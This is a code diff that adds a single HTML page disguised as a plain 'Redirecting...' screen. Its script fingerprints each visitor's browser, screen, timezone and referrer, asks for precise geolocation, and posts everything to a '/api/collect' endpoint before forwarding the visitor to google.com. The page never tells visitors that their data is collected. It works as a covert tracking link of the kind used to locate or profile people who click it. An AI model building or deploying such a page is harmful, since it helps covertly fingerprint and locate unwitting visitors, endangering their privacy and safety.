@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirecting...</title>
+  <script>
+    async function collectData() {
+      const data = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: {
+          width: screen.width,
+          height: screen.height,
+        },
+        referrer: document.referrer,
+      };
+
+      // Try to get location (asks for permission)
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          data.location = {
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+          };
+          await sendData(data);
+        }, async () => {
+          await sendData(data); // Permission denied
+        });
+      } else {
+        await sendData(data);
+      }
+    }
+
+    async function sendData(data) {
+      await fetch("/api/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data),
+      });
+      window.location.href = "https://google.com"; // change redirect here
+    }
+
+    collectData();
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
